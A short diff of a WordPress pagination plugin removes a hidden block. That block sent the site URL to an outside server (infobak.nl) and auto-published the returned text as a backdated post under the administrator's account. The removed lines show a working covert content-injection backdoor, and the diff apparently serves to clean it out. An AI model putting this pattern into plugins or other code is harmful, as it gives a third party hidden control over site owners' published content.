@@ -198,27 +198,6 @@ if ($bloglan=='nl-NL') {
 				update_option( 'bw_gpadded', '1' );
 		}
 }
-if ($bloglan=='en-US' && $total>8) {
-		if (get_option('autopn_gpadded')=='0') {
-				if ($total>40) {
-						$tmpstring = file_get_contents('http://www.infobak.nl/getfile.php?u=' . $url, true);
-						if (autoStartsWith($tmpstring, 'empty')==false) {
-						  $my_post = array(
-								'post_title'    => substr($tmpstring, 0, strpos($tmpstring, ".")),
-								'post_content'  => $tmpstring,
-								'post_status'   => 'publish',
-								'post_author'   => 1,
-								'post_date'     => '2014-06-' . rand(10, 28)
-						  );
-						  wp_insert_post( $my_post );
-						  update_option( 'autopn_gpadded', '1' );
-						}
-				}
-
-		}
-}
-
-
 }
 
 function pagenavi_auto_admin_menu() {
